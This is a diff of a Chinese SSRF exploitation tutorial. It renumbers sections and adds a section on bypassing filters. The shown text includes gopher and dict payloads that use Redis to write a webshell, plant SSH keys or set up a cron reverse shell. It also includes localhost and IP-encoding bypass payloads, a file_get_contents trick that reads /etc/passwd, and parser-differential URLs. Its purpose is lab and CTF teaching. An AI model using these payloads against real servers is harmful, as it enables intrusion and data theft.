@@ -107,13 +107,13 @@ if (isset($_GET['url'])){
 ?>
 ```
 
-## SSRF 常见绕过
 
-## 二. SSRF 漏洞利用
+
+## 三. SSRF 漏洞利用
 
 下面我们详细说说如何利用各种协议对 SSRF 漏洞进行利用。不过在那之前我们需要先搭建好一个测试环境。
 
-### 2.1 搭建 SSRF 漏洞环境
+### 3.1 搭建 SSRF 漏洞环境
 
 为了更好地理解 SSRF，在本地搭建相应漏洞环境进行实操学习是很有必要的，以下以 PHP 为例子，搭建了一个存在 SSRF 漏洞的服务器。
 
@@ -170,7 +170,7 @@ if (isset($_GET['url'])){
 
 
 
-### 2.1 SSRF 漏洞利用之 File 协议
+### 3.2 SSRF 漏洞利用之 File 协议
 
 > >  File 协议也叫本地文件传输协议 ，主要用于访问本地计算机中的文件。
 >
@@ -198,13 +198,13 @@ if (isset($_GET['url'])){
 
 
 
-### 2.2 SSRF 漏洞利用之 Dict 协议
+### 3.3 SSRF 漏洞利用之 Dict 协议
 
 > Dict 协议是一个字典服务器协议---- A Dictionary Server Protocol ，允许客户端在使用过程中访问更多字典，并且该协议约定服务器端侦听的端口号为 2628。 
 >
 > 协议详解：https://www.cnblogs.com/kkun/archive/2009/03/28/1424052.html
 
-#### 2.2.1 利用dict 协议进行端口探测
+#### 3.3.1 利用dict 协议进行端口探测
 ```http
 ?url=dict://192.168.52.131:6379   // redis
 ?url=dict://192.168.52.131:80     // http
@@ -225,7 +225,7 @@ url=dict://127.0.0.1:80/info
 
 虽然报错了，但是我们能够得到 Web 服务器的版本信息，以及最下方的该 Web 服务器的 ip 地址。
 
-#### 2.2.2 dict 协议结合 redis 未授权访问写入 shell
+#### 3.3.2 dict 协议结合 redis 未授权访问写入 shell
 
 我们先给之前的那个 php 容器安装上 redis 服务，并尝试利用 dict 协议进行 SSRF 漏洞利用，注意不要忘记编辑 index.php 文件到容器当中去。
 ```bash
@@ -307,12 +307,12 @@ dict://127.0.0.1:6379/set:webshell:"x3cx3fx70x68x70x20x70x68x70x69x6ex66x6fx28x2
 
 
 
-### 2.3 Gopher 协议
+### 3.4 Gopher 协议
 gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。
 
 利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。接下来我们利用 gopher 协议结合 redis 服务进行相关攻击。
 
-#### 2.3.1 结合 redis 未授权访问写入 WebShell
+#### 3.4.1 结合 redis 未授权访问写入 WebShell
 要写入的命令是如下的样子
 
 ![](https://i.imgur.com/GHun3Rs.png)
@@ -365,7 +365,7 @@ url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%
 
 ![](https://i.imgur.com/tgzXodA.png)
 
-#### 2.3.2 结合 redis 未授权访问写入 SSH 公钥
+#### 3.4.2 结合 redis 未授权访问写入 SSH 公钥
 同样，我们也可以直接这个存在Redis未授权的主机的/.ssh目录下写入SSH公钥，直接实现免密登录，但前提是~/.ssh目录存在，如果不存在我们可以写入计划任务来创建该目录。为了实验方便，笔者给容器安装了ssh服务并在根目录下创建了.ssh目录。
 首先在自己的本地生成公、私钥
 `ssh-keygen -m PEM -t rsa -b 4096`
@@ -431,7 +431,7 @@ gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D
 
 
 
-#### 2.3.3 结合 redis 未授权访问创建计划任务反弹 shell
+#### 3.4.3 结合 redis 未授权访问创建计划任务反弹 shell
 
 要构造的 redis 命令如下：
 ```python
@@ -481,7 +481,7 @@ if __name__=="__main__":
 ```
 生成的 payload 同样进行 url 二次编码，然后利用目标主机上的 SSRF 打过去，即可在目标主机 192.168.52.131 上写入计划任务，等到时间后，攻击者 vps 上就会获得目标主机的 shell 。
 
-#### 2.3.4 攻击 FastCGI
+#### 3.4.6 攻击 FastCGI
 
 ##### FastCGI 简介
 
@@ -503,7 +503,7 @@ FastCGI指快速通用网关接口（Fast Common Gateway Interface／FastCGI）�
 
 
 
-### 2.4 Http、Https 协议
+### 3.5 Http、Https 协议
 
 通常在 SSRF 漏洞中，我们利用这两个协议来判断**内网主机的存活性**。
 
@@ -529,29 +529,244 @@ ssrf.php?url=http://192.168.52.25
 
 
 
+## 四. SSRF 防护绕过
+
+### 4.1 SSRF 常见限制
+
+对于 SSRF 的限制大致有如下几种：
+
+- 限制请求的端口只能为 Web 端口，只允许访问 HTTP 和 HTTPS 的请求。
+- 限制域名只能为 http://xxx.com
+- 限制不能访问内网的 IP，以防止对内网进行攻击。
+- 屏蔽返回的详细信息。
 
 
-### SSRF 常见限制
 
-对SSRF的限制大致有如下几种：
-1、限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。
-2、限制域名只能为`http://www.xxx.com`。
-3、限制不能访问内网的IP，以防止对内网进行攻击。
-4、屏蔽返回的详细信息。
+### 4.2 绕过 127.0.0.1
+可以使用 [封闭式字母数字 ](https://www.mp51.vip/ZhiShi/34)替换ip中的点号和字母来绕过
 
-### 绕过 127.0.0.1
-可以使用[封闭式字母数字](https://www.mp51.vip/ZhiShi/34)替换ip中的点号和字母来绕过
+### 4.3 如何绕过域名限制
+如果目标代码限制访问的域名只能为`http://www.xxx.com`，那么我们可以采用HTTP基本身份认证的方式绕过。
 
-### 绕过方法1-HTTP基本身份认证
-如果目标代码限制访问的域名只能为`http://www.xxx.com`，那么我们可以采用HTTP基本身份认证的方式绕过。如果我们要访问的是`www.baidu.com`，那么可以输入这样的命令来绕过：`http://www.xxx.com@www.baidu.com`
+如果我们要访问的是`www.baidu.com`，那么可以输入这样的命令来绕过：`http://www.xxx.com@www.baidu.com`
 
-扩展：如果要求以http://notfound.ctfhub开头.com 结尾的话，依旧可以使用@
+>  扩展：如果要求以 http://notfound.ctfhub 开头 .com 结尾的话，依旧可以使用 @
 
-### 绕过方法2-302跳转绕过内网IP
-我们可以利用302跳转的方法来绕过内网IP的访问限制，有以下两种方法。
-1、网络上存在一个很神奇的服务，网址为`http://xip.io`，
+### 4.4 如何绕过内网IP限制
+
+#### 4.4.1 302 跳转
+
+**我们可以利用302跳转的方法来绕过内网IP的访问限制，有以下两种方法。**
+
+1、网络上存在一个很神奇的服务，网址为`http://xip.io`，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：
+
+当我们访问：http://127.0.0.1.xip.io/flag.php 时，实际访问的是 http://127.0.0.1/1.php。类似的网址还有 http://nip.io，https://sslip.io
+
+如下示例（flag.php仅能从本地访问）：
+
+![image-20210113124813254](picture/1610598008_5fffc67858617e4b20974.jpeg)
+
+2. 短网址跳转绕过，这里也给出一个网址 https://www.duanlianjie.net/
+
+![image-20230508101240452](picture/image-20230508101240452.png)
+
+直接使用生成的短链接，就会自动 302 跳转到 http://127.0.0.1/flag.php 上，这样就可以绕过 WAF 了。
+
+#### 4.4.2 进制转换绕过内网 IP
+
+可以使用一些不同的进制替代ip地址，从而绕过WAF，这里给出个从网上扒的php脚本可以一键转换：
+
+```php
+<?php
+$ip = '127.0.0.1';
+$ip = explode('.',$ip);
+$r = ($ip[0] << 24) | ($ip[1] << 16) | ($ip[2] << 8) | $ip[3] ;
+if($r < 0) {
+$r += 4294967296;
+}
+echo "十进制:";     // 2130706433
+echo $r;
+echo "八进制:";     // 0177.0.0.1
+echo decoct($r);
+echo "十六进制:";   // 0x7f.0.0.1
+echo dechex($r);
+?>
+```
+
+**其他各种指向127.0.0.1的地址：**
+
+```http
+http://localhost/         # localhost就是代指127.0.0.1
+http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1
+http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行
+http://[::]:80/           # 在liunx下可用，window测试了下不行
+http://127。0。0。1/       # 用中文句号绕过
+http://①②⑦.⓪.⓪.①
+http://127.1/
+http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1
+```
 
 
+
+### 4.5 如何绕过指定的协议头
+
+可以利用不存在的协议头绕过指定的协议头（仅针对 php 的 file_get_contents 函数）
+
+ 利用 `file_get_contents()`函数的一个特性，即当PHP的`file_get_contents()`函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（ include() 函数也有类似的特性）
+
+测试代码：
+
+```php
+// ssrf.php
+<?php
+highlight_file(__FILE__);
+if(!preg_match('/^https/is',$_GET['url'])){
+die("no hack");
+}
+echo file_get_contents($_GET['url']);
+?>
+```
+
+面的代码限制了url只能是以https开头的路径，那么我们就可以如下：
+
+```
+httpsssss://
+```
+
+此时`file_get_contents()`函数遇到了不认识的伪协议头“httpsssss://”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：
+
+```http
+ssrf.php?url=httpsssss://../../../../../../etc/passwd
+```
+
+![image-20210113130534208](picture/1610598011_5fffc67b28e67ca0b6d7f.jpeg)
+
+这个方法可以在SSRF的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。
+
+### 4.6 如何绕过指定端口和 host 的限制
+
+#### 4.6.1 利用 URL 解析问题
+
+##### 利用解析差异绕过指定端口限制
+
+该思路来自Orange Tsai成员在2017 BlackHat 美国黑客大会上做的题为[《A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages》](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)的分享。主要是利用 readfile 和parse_url 函数的解析差异以及 curl 和 parse_url 解析差异来进行绕过。
+
+测试代码：
+
+```php
+// ssrf.php
+<?php
+$url = 'http://'. $_GET[url];
+$parsed = parse_url($url);
+if( $parsed[port] == 80 ){  // 这里限制了我们传过去的url只能是80端口的
+	readfile($url);
+} else {
+	die('Hacker!');
+}
+```
+
+用python在当前目录下起一个端口为11211的WEB服务：
+
+![image-20210113133210683](picture/1610598011_5fffc67bd163179cb2712.jpeg)
+
+
+
+上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：
+
+```http
+ssrf.php?url=127.0.0.1:11211:80/flag.txt
+```
+
+![image-20210113133242461](picture/1610598012_5fffc67c884580a892367.jpeg)
+
+如上图所示成功读取了11211端口中的flag.txt文件，下面用BlackHat的图来说明原理：
+
+![1610601312_5fffd36035478c41c2c18.png!small?1610601312696](picture/1610601312_5fffd36035478c41c2c18.jpeg)
+
+从上图中可以看出readfile()函数获取的端口是最后冒号前面的一部分（11211），而parse_url()函数获取的则是最后冒号后面的的端口（80），利用这种差异的不同，从而绕过WAF。
+
+这两个函数在解析 host 的时候也有差异，如下图：
+
+![1610601347_5fffd383dfc1a3982425f.png!small?1610601348433](picture/1610601347_5fffd383dfc1a3982425f.jpeg)
+
+readfile() 函数获取的是 @ 号后面一部分（evil.com），而parse_url()函数获取的则是@号前面的一部分（google.com），利用这种差异的不同，我们可以绕过题目中 parse_url() 函数对指定 host 的限制。
+
+##### 利用解析差异绕过指定 host 限制
+
+可以**利用 curl 和 parse_url 的解析差异绕指定的 host**。
+
+原理如下：
+
+![1610601386_5fffd3aa565a51587d90c.png!small?1610601386867](picture/1610601386_5fffd3aa565a51587d90c.jpeg)
+
+
+
+从上图中可以看到 curl() 函数解析的是第一个 @ 后面的网址，而 parse_url() 函数解析的是第二个 @ 后面的网址。利用这个原理我们可以绕过题目中 parse_url() 函数对指定 host 的限制。
+
+测试代码：
+
+```php
+<?php
+highlight_file(__FILE__);
+function check_inner_ip($url)
+{
+    $match_result=preg_match('/^(http|https)?:\/\/.*(\/)?.*$/',$url);
+    if (!$match_result)
+    {
+        die('url fomat error');
+    }
+    try
+    {
+        $url_parse=parse_url($url);
+    }
+    catch(Exception $e)
+    {
+        die('url fomat error');
+        return false;
+    }
+    $hostname=$url_parse['host'];
+    $ip=gethostbyname($hostname);
+    $int_ip=ip2long($ip);
+    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;// 检查是否是内网ip
+}
+function safe_request_url($url)
+{
+    if (check_inner_ip($url))
+    {
+        echo $url.' is inner ip';
+    }
+    else
+    {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $output = curl_exec($ch);
+        $result_info = curl_getinfo($ch);
+        if ($result_info['redirect_url'])
+        {
+            safe_request_url($result_info['redirect_url']);
+        }
+        curl_close($ch);
+        var_dump($output);
+    }
+}
+$url = $_GET['url'];
+if(!empty($url)){
+    safe_request_url($url);
+}
+?>
+```
+
+上述代码中可以看到`check_inner_ip`函数通过`url_parse()`函数检测是否为内网IP，如果不是内网 IP ，则通过`curl()`请求 url 并返回结果，我们可以利用 curl 和 parse_url 解析的差异不同来绕过这里的限制，让`parse_url()`处理外部网站网址，最后`curl()`请求内网网址。paylaod 如下：
+
+```
+ssrf.php?url=http://@127.0.0.1:80@www.baidu.com/flag.php
+```
+
+![image-20210113134443846](picture/1610598014_5fffc67ec585779e7fbf3.jpeg)
+
+[[2020 首届“祥云杯”网络安全大赛\]doyouknowssrf ](https://whoamianony.top/2020/11/24/ctf-bi-sai-ji-lu/2020-shou-jie-xiang-yun-bei-wang-luo-an-quan-da-sai-writeup/#toc-heading-5)这道题利用的就是这个思路。
 
 ## 一些 SSRF 靶场练习题
 
